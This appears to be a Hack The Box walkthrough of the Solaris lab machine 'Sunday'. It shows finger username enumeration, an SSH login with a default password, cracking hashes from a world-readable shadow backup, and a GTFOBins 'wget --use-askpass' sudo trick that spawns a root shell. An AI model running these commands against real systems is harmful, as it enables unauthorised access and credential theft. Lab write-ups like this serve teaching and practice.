#Linux #Finger #Solaris #PasswordSpray #SSH #ShadowBackup #john #sudo #wget #GTFOBins

## Overview

Sunday is an easy Hack The Box machine running Oracle Solaris, a platform you don't see often on HTB. The `finger` service leaks valid usernames; a trivial default password gets a foothold. A world-readable shadow file backup in `/backup` yields a crackable hash for a second user. That user can run `wget` as root, and the GTFOBins technique for `wget` escalates to a root shell.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
```

The `finger` service on 79 and non-standard SSH on 22022 are the leads.

### Finger User Enumeration

The `finger-user-enum.pl` Perl script brute-forces valid usernames against the finger daemon:

```perl
perl finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.129.23.89
```

Valid usernames returned:

```
sunny@10.129.23.89
sammy@10.129.23.89
root@10.129.23.89
```

> **Why finger leaks usernames:** the `finger` protocol was designed to query information about logged-in users. Many implementations respond differently to valid vs. invalid usernames even when no one is logged in, making username enumeration trivial against any system running `fingerd`.

## Foothold

### Default SSH Credentials

With usernames in hand, trying the obvious default `sunny:sunday` against SSH on port 22022 succeeds immediately:

```sh
ssh sunny@10.129.23.89 -p 22022
(sunny@10.129.23.89) Password: [sunday]
Oracle Solaris 11.4.42.111.0    Assembled December 2021
sunny@sunday:~$ whoami
sunny
```

## Privilege Escalation

### Shadow Backup → Hash Crack

The directory `/backup` contains a world-readable shadow file backup:

```
sunny@sunday:/backup$ cat shadow.backup
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

> **Why a shadow backup matters:** `/etc/shadow` is normally root-readable only. A backup copy left in a world-readable location defeats that protection entirely. Both hashes here are `sha256crypt` (`$5$`), which john handles well.

Save sammy's hash and crack it:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
cooldude!        (sammy)
```

Credentials gained:

```
sammy : cooldude!
```

### wget sudo → Root

SSH in as sammy and check sudo rights:

```sh
ssh sammy@10.129.23.89 -p 22022
-bash-5.1$ sudo -l
    (root) NOPASSWD: /usr/bin/wget
```

> **The GTFOBins `wget` sudo trick:** `wget` supports `--use-askpass`, which executes an external program to supply the password for authentication. When that program is a shell script that execs `/bin/sh` on file descriptor 0, and `wget` is running as root, the result is a root shell. No network request is ever made, `wget` invokes the script locally before attempting any connection.

```sh
-bash-5.1$ TF=$(mktemp)
-bash-5.1$ chmod +x $TF
-bash-5.1$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
-bash-5.1$ sudo wget --use-askpass=$TF 0
root@sunday:/home/sammy# whoami
root
```

## Root

```sh
root@sunday:/home/sammy# cat /root/root.txt
‹redacted›
```

User flag was also readable at `/root/root.txt` after escalation (the notes show both flags were retrieved from the root shell):

```sh
root@sunday:/home/sammy# cat user.txt
‹redacted›
```

## Takeaways

- **`finger` is a username oracle.** Any system running `fingerd` should be tested for user enumeration before moving on to other vectors.
- **Default credentials are worth trying on every account.** The username `sunny` and the box name `sunday` as the password is the kind of guess that pays off regularly.
- **World-readable backup files of sensitive data are a direct privesc path.** `/backup/shadow.backup` gave crackable hashes for both users.
- **GTFOBins covers `wget` sudo.** The `--use-askpass` trick is non-obvious but reliable when `wget` is in the sudoers list.
